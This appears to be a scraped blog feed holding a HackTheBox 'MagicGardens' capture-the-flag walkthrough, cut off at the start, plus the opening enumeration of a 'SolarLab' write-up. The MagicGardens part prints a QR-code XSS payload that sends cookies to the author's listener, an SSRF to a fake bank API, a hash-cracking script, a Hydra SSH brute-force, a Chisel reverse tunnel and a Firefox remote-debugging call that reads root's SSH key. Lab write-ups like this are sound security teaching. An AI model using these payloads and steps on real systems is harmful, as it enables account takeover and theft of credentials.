SF:dshake\\x20error\\n\\0\u0026#34;)%r(JavaRMI,15,\u0026#34;\\[x\\]\\x20Handshake\\x20error\\n\\0\u0026#34;)%r SF:(ms-sql-s,15,\u0026#34;\\[x\\]\\x20Handshake\\x20error\\n\\0\u0026#34;)%r(afp,15,\u0026#34;\\[x\\]\\x20Hand SF:shake\\x20error\\n\\0\u0026#34;)%r(giop,15,\u0026#34;\\[x\\]\\x20Handshake\\x20error\\n\\0\u0026#34;); Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port OS fingerprint not ideal because: Missing a closed TCP port so results incomplete Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%) No exact OS matches for host (test conditions non-ideal). TCP/IP fingerprint: SCAN(V=7.94SVN%E=4%D=5/21%OT=22%CT=%CU=36529%PV=Y%DS=2%DC=T%G=N%TM=664C4589%P=x86_64-pc-linux-gnu) SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A) OPS(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11NW7%O6=M552ST11) WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88) ECN(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=) T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=) T2(R=N) T3(R=N) T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=) T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=) T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=) T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=) U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G) IE(R=Y%DFI=N%T=40%CD=S) Uptime guess: 19.495 days (since Wed May 1 15:02:55 2024) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=262 (Good luck!) IP ID Sequence Generation: All zeros Service Info: Host: magicgardens.magicgardens.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 22/tcp) HOP RTT ADDRESS 1 86.15 ms 10.10.14.1 2 90.57 ms magicgardens.htb (10.10.11.9) I ran Gobuster on the HTTP port to explore the web service for any potentially interesting findings or endpoints. Here\u0026rsquo;s the output from Gobuster:\n1 2 3 4 5 6 7 8 9 10 /search (Status: 301) [Size: 0] [--\u0026gt; /search/] /login (Status: 301) [Size: 0] [--\u0026gt; /login/] /register (Status: 301) [Size: 0] [--\u0026gt; /register/] /profile (Status: 301) [Size: 0] [--\u0026gt; /profile/] /subscribe (Status: 301) [Size: 0] [--\u0026gt; /subscribe/] /catalog (Status: 301) [Size: 0] [--\u0026gt; /catalog/] /admin (Status: 301) [Size: 0] [--\u0026gt; /admin/] /cart (Status: 301) [Size: 0] [--\u0026gt; /cart/] /logout (Status: 301) [Size: 0] [--\u0026gt; /logout/] /check (Status: 301) [Size: 0] [--\u0026gt; /check/] Initial Access I visited the \u0026lsquo;admin\u0026rsquo; page, which displayed \u0026lsquo;Django Login,\u0026rsquo; indicating it\u0026rsquo;s a login page for a Django application. Additionally, I found an \u0026lsquo;Upgrade Subscription\u0026rsquo; option in the \u0026lsquo;/profile\u0026rsquo; endpoint within our web application.\nI intercepted the request and modified it to redirect to my bank (netcat session), resulting in the following outcome:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 ‚îå‚îÄ‚îÄ(kali„âøkali)-[~] ‚îî‚îÄ$ nc -nvlp 6969 listening on [any] 6969 ... connect to [10.10.14.46] from (UNKNOWN) [10.10.11.9] 48528 POST /api/payments/ HTTP/1.1 Host: 10.10.14.46:6969 User-Agent: python-requests/2.31.0 Accept-Encoding: gzip, deflate Accept: */* Connection: keep-alive Content-Length: 133 Content-Type: application/json {\u0026#34;cardname\u0026#34;: \u0026#34;Caleb Daniel\u0026#34;, \u0026#34;cardnumber\u0026#34;: \u0026#34;5358966261393853\u0026#34;, \u0026#34;expmonth\u0026#34;: \u0026#34;Janurary\u0026#34;, \u0026#34;expyear\u0026#34;: \u0026#34;2029\u0026#34;, \u0026#34;cvv\u0026#34;: \u0026#34;081\u0026#34;, \u0026#34;amount\u0026#34;: 25} Not particularly useful in terms of gaining access, but we did identify that the web application is using Python Requests version 2.31.0. Perhaps we could attempt to create our own bank API with a similar structure required for the previous POST request and simulate a fake purchase to see if any vulnerabilities surface.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/flask-bank-api] ‚îî‚îÄ$ ls app.py ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/flask-bank-api] ‚îî‚îÄ$ cat app.py from flask import Flask, jsonify, request app = Flask(__name__) @app.route(\u0026#39;/api/payments/\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def handle_payment(): req_json = request.get_json() req_json[\u0026#39;status\u0026#39;] = \u0026#34;200\u0026#34; print(req_json) return jsonify(req_json) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=80, debug=True) ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/flask-bank-api] ‚îî‚îÄ$ python app.py * Serving Flask app \u0026#39;app\u0026#39; * Debug mode: on WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead. * Running on all addresses (0.0.0.0) * Running on http://127.0.0.1:80 * Running on http://192.168.146.128:80 Press CTRL+C to quit * Restarting with stat * Debugger is active! * Debugger PIN: 128-738-132 I replaced the bank URL with my own Flask API that we created, and subsequently, I observed the information being sent to us through our Flask app bank API.\nAs we can see, the fake bank API we created enabled us to successfully complete the subscription process.\nAfter some exploration and broadening the scope of the web application, I discovered an interesting feature: when purchasing a product (e.g., flowers), we receive a message from Morty offering a 25% discount in exchange for a QR code. Given that Morty is a valid user, I started considering the possibility of stealing his token using XSS through a file upload feature. This could be a potential avenue for further investigation.\nI attempted to craft a malicious QR code PNG payload to capture the session token of the user \u0026lsquo;morty.\u0026rsquo;\nThe payload I used was: 098f6bcd4621d373cade4e832627b4f6.0d341bcdc6746f1d452b3f4de32357b9.\u0026lt;/p\u0026gt;\u0026lt;script\u0026gt;var i=new Image(); i.src=\u0026quot;http://10.10.14.46:7777/?cookie=\u0026quot;+btoa(document.cookie);\u0026lt;/script\u0026gt;\u0026lt;p\u0026gt;, and Of course, this payload was embedded within a QR code in PNG format.\nI crafted this payload using the CyberChef website, then uploaded it to the message box. After waiting for a while, I successfully captured the cookie:\n1 10.10.11.9 - - [21/May/2024 09:48:22] \u0026#34;GET /?cookie=Y3NyZnRva2VuPXpPVGE3bUhxRzhZUGc1TVA1V3lLRFNzOGZQbVF2ZVFFOyBzZXNzaW9uaWQ9LmVKeE5qVTFxd3pBUWhaTkZRZ01waFp5aTNRaExsdU5vVjdydnFnY3draXhGYmhNSjlFUHBvdEFEekhKNjN6cHVBcDdkOTc3SG01X1Y3MjY1bU80YkgtR3VKQk85UEJ1RTFUbkVfSVd3VGxubWtzYmdMVXRyRVRhZlEzTGRhVWdaWVlHd25WQ0g0ck9KNk5hdzBUTG1mel9TZHFLWnZ1OWt5YTY3UE9xR0htSEpFSGF6VEVuOVlmd29udnAzNlktQjZPQnpIQlM1Vk1qVkp2SWFlbk42dVhVZlpnTk9Kb2Z3VEJ0dG1XMEZyVTNWY0diTWdXbFJLY1dwdElJeTJSeXFmYTF0MC1vOVZZcXB5ckNhRzA2MWFtdXVoY0JDX2dEZXMyWDc6MXM5UGxVOmMwZTRZaGJWVjlpem0yMVZudXl2YlNRR0NkcWI3VVlFbFhPMDlSVHpCSkU= HTTP/1.1\u0026#34; 200 - Using the captured cookie, I successfully logged in to the Django admin login page.\nI discovered the password hash on the admin page and then proceeded to write the following script to crack it:\n1 2 3 4 5 6 7 8 9 10 11 from passlib.hash import django_pbkdf2_sha256 hash = \u0026#39;HASH VALUE HERE\u0026#39; # enter the hash value here to decrypt rounds = hash.split(\u0026#39;$\u0026#39;)[1] salt = hash.split(\u0026#39;$\u0026#39;)[2] with open(\u0026#34;../rockyou.txt\u0026#34;, \u0026#34;r\u0026#34;, errors=\u0026#34;ignore\u0026#34;) as f: for key in f: secret = key.split()[0] print(secret, end=\u0026#39;\\r\u0026#39;) if django_pbkdf2_sha256.hash(secret, rounds=rounds, salt=salt) == hash: print(\u0026#34;password: \u0026#34; + secret) We also have the option to use hashcat, which successfully cracked the password as \u0026lsquo;jonasbrothers.\u0026rsquo; Alternatively, we can perform SSH brute-forcing with Hydra using the rockyou.txt wordlist. I executed the command: hydra -l morty -P /usr/share/wordlists/rockyou.txt ssh://magicgardens.htb to attempt to brute-force the user \u0026lsquo;morty\u0026rsquo; and see if it works. Indeed, it seems that by skipping the step of stealing the cookie and directly attempting SSH brute-forcing, we can still uncover the password.\nAfter some time, the password was successfully cracked:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ‚îå‚îÄ‚îÄ(kali„âøkali)-[~] ‚îî‚îÄ$ hydra -l morty -P /usr/share/wordlists/rockyou.txt ssh://magicgardens.htb Hydra v9.5 (c) 2023 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-21 04:05:23 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task [DATA] attacking ssh://magicgardens.htb:22/ [STATUS] 109.00 tries/min, 109 tries in 00:01h, 14344293 to do in 2193:20h, 13 active [STATUS] 92.00 tries/min, 276 tries in 00:03h, 14344126 to do in 2598:35h, 13 active [STATUS] 85.86 tries/min, 601 tries in 00:07h, 14343801 to do in 2784:26h, 13 active [STATUS] 81.93 tries/min, 1229 tries in 00:15h, 14343173 to do in 2917:40h, 13 active [22][ssh] host: magicgardens.htb login: morty password: jonasbrothers 1 of 1 target successfully completed, 1 valid password found [WARNING] Writing restore file because 3 final worker threads did not complete until end. [ERROR] 3 targets did not resolve or could not be connected [ERROR] 0 target did not complete Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-21 04:31:36 I promptly SSHed to the user account, but to my surprise, there was no user.txt file. It seems that it might be located in a different user\u0026rsquo;s directory. Interestingly, there is a user named \u0026lsquo;alex,\u0026rsquo; so it\u0026rsquo;s possible our user flag might be there. Let\u0026rsquo;s investigate further.\nRoot Flag \u0026amp; User Flag Upon running Linpeas on the machine, I discovered a Firefox process running as root, with remote debugging enabled and configured to allow localhost on port 34001. This could potentially provide us with a means of further exploration and privilege escalation.\n1 root 1936 4.9 11.6 11875692 467716 ? Sl May20 16:51 _ firefox-esr --marionette --headless --remote-debugging-port 34001 --remote-allow-hosts localhost -no-remote -profile /tmp/rust_mozprofileu1v0Uq I proceeded to use Chisel to set up port forwarding to gain access from my local machine. Here\u0026rsquo;s what I did after transferring Chisel to the Linux box:\nOn my Kali machine: ./chisel server -p 8000 --reverse On the target machine: ./chisel client 10.10.14.46:8000 R:34001:127.0.0.1:34001 Once completed, we can access the Firefox remote debugging port at localhost:34001. This should enable us to interact with the Firefox process running as root on the target machine.\nAs observed, there is an httpd.js running on this port. I proceeded to attempt brute-forcing the directory, which uncovered various endpoints:\n1 2 3 /trace (Status: 200) [Size: 194] /json (Status: 200) [Size: 302] /session (Status: 400) [Size: 61] The \u0026ldquo;/trace\u0026rdquo; endpoint contains the following content:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 Request-URI: http://localhost:34001/trace Request (semantically equivalent, slightly reformatted): GET /trace HTTP/1.1 host: localhost:51523 user-agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 accept-language: en-US,en;q=0.5 accept-encoding: gzip, deflate connection: close cookie: jiveforums.admin.logviewer=logfile.size=1700758 upgrade-insecure-requests: 1 sec-fetch-dest: document sec-fetch-mode: navigate sec-fetch-site: none sec-fetch-user: ?1 The \u0026ldquo;/json\u0026rdquo; endpoint contains the following content:\n1 2 3 4 5 6 7 8 9 10 11 [ { \u0026#34;description\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;devtoolsFrontendUrl\u0026#34;: null, \u0026#34;faviconUrl\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;id\u0026#34;: \u0026#34;96a0d569-23aa-46ad-8815-5fc1f1a4fbb8\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;page\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;http://magicgardens.htb/admin/store/order/\u0026#34;, \u0026#34;webSocketDebuggerUrl\u0026#34;: \u0026#34;ws://127.0.0.1:34001/devtools/page/96a0d569-23aa-46ad-8815-5fc1f1a4fbb8\u0026#34; } ] I encountered an error when accessing the \u0026ldquo;/session\u0026rdquo; endpoint: \u0026ldquo;The handshake request has incorrect Upgrade header: undefined\u0026rdquo;.\nTo address this, I installed websocat, similar to netcat, on my target machine from the following link: websocat v1.13.0\nAfter installation, I executed the following command:\n1 2 3 4 5 6 7 8 9 morty@magicgardens:/tmp$ curl http://127.0.0.1:34001/json/version { \u0026#34;Browser\u0026#34;: \u0026#34;Firefox/115.10.0\u0026#34;, \u0026#34;Protocol-Version\u0026#34;: \u0026#34;1.3\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\u0026#34;, \u0026#34;V8-Version\u0026#34;: \u0026#34;1.0\u0026#34;, \u0026#34;WebKit-Version\u0026#34;: \u0026#34;1.0\u0026#34;, \u0026#34;webSocketDebuggerUrl\u0026#34;: \u0026#34;ws://127.0.0.1:34001/devtools/browser/9504c560-b7ca-475f-bd9c-90354827c584\u0026#34; } After installing websocat, I proceeded to run the following command(on target machine):\n1 2 echo \u0026#39;{\u0026#34;id\u0026#34;: 1, \u0026#34;method\u0026#34;: \u0026#34;Target.createTarget\u0026#34;, \u0026#34;params\u0026#34;: {\u0026#34;url\u0026#34;: \u0026#34;file:///root/.ssh/id_rsa\u0026#34;}}\u0026#39; | ./websocat.x86_64-unknown-linux-musl ws://127.0.0.1:34001/devtools/browser/9504c560-b7ca-475f-bd9c-90354827c584 {\u0026#34;id\u0026#34;:1,\u0026#34;result\u0026#34;:{\u0026#34;targetId\u0026#34;:\u0026#34;151f6650-6d16-4d66-809b-f6dc06b2643b\u0026#34;}} I was attempting to create a new target in the browser\u0026rsquo;s DevTools by sending a JSON command through a WebSocket connection. I crafted a JSON string that included my desired method, \u0026ldquo;Target.createTarget,\u0026rdquo; along with the parameters specifying the URL of a local file, which happened to be my SSH private key stored at \u0026ldquo;file:///root/.ssh/id_rsa.\u0026rdquo; Using the websocat tool, I piped this command to the WebSocket server running at \u0026ldquo;ws://127.0.0.1:34001/devtools/browser/9504c560-b7ca-475f-bd9c-90354827c584.\u0026rdquo; Upon execution, I received a response in JSON format, indicating success with a new target ID: \u0026ldquo;151f6650-6d16-4d66-809b-f6dc06b2643b.\u0026rdquo;\nAfter this, I ran this:\n1 echo \u0026#39;Page.printToPDF {}\u0026#39; | ./websocat.x86_64-unknown-linux-musl -n1 --jsonrpc --jsonrpc-omit-jsonrpc ws://127.0.0.1:34001/devtools/page/151f6650-6d16-4d66-809b-f6dc06b2643b I was working on printing the contents of a webpage to a PDF using the DevTools protocol over a WebSocket connection. After successfully creating a target with the ID \u0026ldquo;151f6650-6d16-4d66-809b-f6dc06b2643b,\u0026rdquo; I prepared another command. This time, I needed to invoke the \u0026ldquo;Page.printToPDF\u0026rdquo; method to generate a PDF from the specified page. Using the websocat tool again, I sent the command in a JSON format without the \u0026ldquo;jsonrpc\u0026rdquo; field, which is a specific option for this tool. The WebSocket connection was established to the server at \u0026ldquo;ws://127.0.0.1:34001/devtools/page/151f6650-6d16-4d66-809b-f6dc06b2643b.\u0026rdquo; This command was executed with the intent of printing the page to a PDF, streamlining the process for further handling or saving the document locally.\nWe received the following JSON file as a reply:\n1 {\u0026#34;id\u0026#34;:1,\u0026#34;result\u0026#34;:{\u0026#34;data\u0026#34;:\u0026#34;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\u0026#34;,\u0026#34;stream\u0026#34;:null}} All I did was copy the base64-encoded data and pasted it into https://base64.guru/converter/decode/pdf to convert it from base64 to PDF format.\nFinally, I used the data from the resulting id_rsa file to log in as the root user. And obtained the both user flag and root flag altogether.\nWith that, we successfully rooted the box, obtaining both the user flag and the root flag.\nConclusion Thanks for following along with my walkthrough! Using various tools and techniques, we successfully identified vulnerabilities, exploited them, and gained root access. Keep exploring and happy hacking!\n","permalink":"http://localhost:1313/writeups/hackthebox/magicgardens/","summary":"MagicGardens is an insane Linux box starting with SSRF and XSS in a QR code to access the Django admin panel and gain SSH. Lateral movement involves reversing a traffic analyzer, with root achieved by exploiting insecure deserialization in Docker and escaping via a custom kernel module.","title":"MagicGardens Writeup - HackTheBox"},{"content":" Link: https://app.hackthebox.com/machines/SolarLab Difficulty Medium Machine Windows Enumeration Nmap\nI ran nmap 10.10.11.16 -vv -p- -T4 first to see all available ports on this box. I checked port 80 (the verbose flag showed us that port 80 was already open) while I waited for the scan to complete. I visited the site after adding 10.10.11.16 solarlab.htb to the /etc/hosts file. This is what the website looks like.\nAs the nmap finished scanning all ports, here are the open ports on this box:\n1 2 3 4 5 6 PORT STATE SERVICE REASON 80/tcp open http syn-ack 135/tcp open msrpc syn-ack 139/tcp open netbios-ssn syn-ack 445/tcp open microsoft-ds syn-ack 6791/tcp open hnm syn-ack I will perform an aggressive scan on these ports using the command: nmap 10.10.11.16 -vv -p80,135,139,445,6791 -T4 -A.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack nginx 1.24.0 |_http-title: SolarLab Instant Messenger |_http-server-header: nginx/1.24.0 | http-methods: |_ Supported Methods: GET HEAD 135/tcp open msrpc syn-ack Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? syn-ack 6791/tcp open http syn-ack nginx 1.24.0 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS 